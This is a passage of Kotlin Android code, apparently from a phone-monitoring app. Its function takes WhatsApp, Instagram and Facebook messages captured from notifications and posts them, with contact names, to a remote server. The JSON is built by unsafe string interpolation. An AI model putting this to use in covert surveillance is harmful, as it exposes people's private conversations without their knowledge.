    }

    /**
     * Send a social media message (WhatsApp, Instagram, Facebook) captured via notification.
     */
    fun sendSocialMessage(
        context: Context,
        app: String,          // "whatsapp", "instagram", "facebook"
        contactName: String,
        message: String,
        timestamp: Long
    ) {
        val deviceId = getDeviceId(context) ?: return
        val escapedMessage = message.replace("\"", "\\\"")
        val json = """
            {
                "deviceId": "$deviceId",
                "app": "$app",
                "contactName": "$contactName",
                "message": "$escapedMessage",
                "timestamp": $timestamp,
                "isIncoming": true
            }
        """.trimIndent()
        val body = RequestBody.create(MediaType.parse("application/json"), json)
        val request = Request.Builder()
            .url("$BASE_URL/messages")
            .post(body)
            .build()
